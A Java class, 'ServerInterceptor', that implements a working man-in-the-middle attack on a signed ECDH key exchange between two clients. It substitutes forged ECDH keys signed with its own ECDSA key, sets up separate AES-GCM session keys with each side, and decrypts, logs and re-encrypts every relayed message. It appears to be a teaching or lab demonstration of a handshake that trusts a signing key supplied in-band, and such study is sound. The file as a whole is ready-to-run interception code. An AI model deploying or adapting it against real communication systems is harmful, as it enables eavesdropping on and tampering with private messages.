import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.MessageDigest;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.Signature;
import java.security.spec.X509EncodedKeySpec;
import java.util.Arrays;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.KeyAgreement;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class ServerInterceptor {

    private KeyPair mitmEcdhForClient1;
    private KeyPair mitmEcdhForClient2;
    private KeyPair mitmEcdsaKeyPair;

    private SecretKeySpec sessionKeyWithClient1;
    private SecretKeySpec sessionKeyWithClient2;

    private boolean client1HandshakeEstablished = false;
    private boolean client2HandshakeEstablished = false;

    public ServerInterceptor() {
        System.out.println("[Server] MITM signed-handshake attack mode");

        try {
            KeyPairGenerator keyGen = KeyPairGenerator.getInstance("EC");
            keyGen.initialize(256);

            mitmEcdhForClient1 = keyGen.generateKeyPair();
            mitmEcdhForClient2 = keyGen.generateKeyPair();
            mitmEcdsaKeyPair = keyGen.generateKeyPair();

        } catch (Exception e) {
            throw new RuntimeException("Failed to initialize MITM keys", e);
        }
    }

    public String onMessageRelay(String message, int fromClient, int toClient) {
        try {
            System.out.println("[MITM] Intercepted from " + fromClient + " to " + toClient + ": " + message);

            if (isHandshakeMessage(message)) {
                return handleHandshake(message, fromClient);
            }

            return handleEncryptedMessage(message, fromClient, toClient);

        } catch (Exception e) {
            System.out.println("[MITM] Error: " + e.getMessage());
            e.printStackTrace();
            return message;
        }
    }

    private boolean isHandshakeMessage(String message) {
        String[] parts = message.split(":");
        return parts.length == 3;
    }

    private String handleHandshake(String message, int fromClient) throws Exception {
        System.out.println("[MITM] Intercepted signed ECDH handshake from client " + fromClient);

        String[] parts = message.split(":");
        String clientEcdhPublicKeyBase64 = parts[0];

        byte[] clientEcdhPublicKeyBytes = Base64.getDecoder().decode(clientEcdhPublicKeyBase64);

        KeyFactory keyFactory = KeyFactory.getInstance("EC");
        X509EncodedKeySpec keySpec = new X509EncodedKeySpec(clientEcdhPublicKeyBytes);
        PublicKey clientEcdhPublicKey = keyFactory.generatePublic(keySpec);

        if (fromClient == 1 && !client1HandshakeEstablished) {
            sessionKeyWithClient1 = deriveSessionKey(clientEcdhPublicKey, mitmEcdhForClient1);
            client1HandshakeEstablished = true;
            System.out.println("[MITM] Shared secret established with client 1");

            return forgeHandshakeMessage(mitmEcdhForClient2);
        }

        if (fromClient == 2 && !client2HandshakeEstablished) {
            sessionKeyWithClient2 = deriveSessionKey(clientEcdhPublicKey, mitmEcdhForClient2);
            client2HandshakeEstablished = true;
            System.out.println("[MITM] Shared secret established with client 2");

            return forgeHandshakeMessage(mitmEcdhForClient1);
        }

        return message;
    }

    private String forgeHandshakeMessage(KeyPair mitmEcdhKeyPair) throws Exception {
        byte[] forgedEcdhPublicKeyBytes = mitmEcdhKeyPair.getPublic().getEncoded();

        Signature signature = Signature.getInstance("SHA256withECDSA");
        signature.initSign(mitmEcdsaKeyPair.getPrivate());
        signature.update(forgedEcdhPublicKeyBytes);
        byte[] signatureBytes = signature.sign();

        String ecdhPublicKeyBase64 = Base64.getEncoder().encodeToString(forgedEcdhPublicKeyBytes);
        String signatureBase64 = Base64.getEncoder().encodeToString(signatureBytes);
        String ecdsaPublicKeyBase64 = Base64.getEncoder().encodeToString(mitmEcdsaKeyPair.getPublic().getEncoded());

        System.out.println("[MITM] Replacing ECDH public key + signature + ECDSA public key");

        return ecdhPublicKeyBase64 + ":" + signatureBase64 + ":" + ecdsaPublicKeyBase64;
    }

    private SecretKeySpec deriveSessionKey(PublicKey otherPublicKey, KeyPair myKeyPair) throws Exception {
        KeyAgreement agreement = KeyAgreement.getInstance("ECDH");
        agreement.init(myKeyPair.getPrivate());
        agreement.doPhase(otherPublicKey, true);
        byte[] sharedSecret = agreement.generateSecret();

        MessageDigest sha256 = MessageDigest.getInstance("SHA-256");
        byte[] hash = sha256.digest(sharedSecret);
        byte[] aesKeyBytes = Arrays.copyOf(hash, 16); // AES-128

        return new SecretKeySpec(aesKeyBytes, "AES");
    }

    private String handleEncryptedMessage(String message, int fromClient, int toClient) throws Exception {
        if (sessionKeyWithClient1 == null || sessionKeyWithClient2 == null) {
            System.out.println("[MITM] Session keys not ready yet");
            return message;
        }

        if (fromClient == 1 && toClient == 2) {
            String clearText = decryptMessage(message, sessionKeyWithClient1);
            System.out.println("[MITM] Message en clair de 1 vers 2 : " + clearText);
            return encryptMessage(clearText, sessionKeyWithClient2);
        }

        if (fromClient == 2 && toClient == 1) {
            String clearText = decryptMessage(message, sessionKeyWithClient2);
            System.out.println("[MITM] Message en clair de 2 vers 1 : " + clearText);
            return encryptMessage(clearText, sessionKeyWithClient1);
        }

        return message;
    }

    private String decryptMessage(String encryptedText, SecretKeySpec aesKey) throws Exception {
        String[] parts = encryptedText.split(":");
        byte[] iv = Base64.getDecoder().decode(parts[0]);
        byte[] ciphertext = Base64.getDecoder().decode(parts[1]);

        GCMParameterSpec gcmSpec = new GCMParameterSpec(128, iv);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, aesKey, gcmSpec);

        byte[] plaintext = cipher.doFinal(ciphertext);
        return new String(plaintext, "UTF-8");
    }

    private String encryptMessage(String plainText, SecretKeySpec aesKey) throws Exception {
        byte[] iv = new byte[12];
        SecureRandom random = new SecureRandom();
        random.nextBytes(iv);

        GCMParameterSpec gcmSpec = new GCMParameterSpec(128, iv);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, aesKey, gcmSpec);

        byte[] ciphertext = cipher.doFinal(plainText.getBytes("UTF-8"));

        String ivBase64 = Base64.getEncoder().encodeToString(iv);
        String cipherBase64 = Base64.getEncoder().encodeToString(ciphertext);

        return ivBase64 + ":" + cipherBase64;
    }
}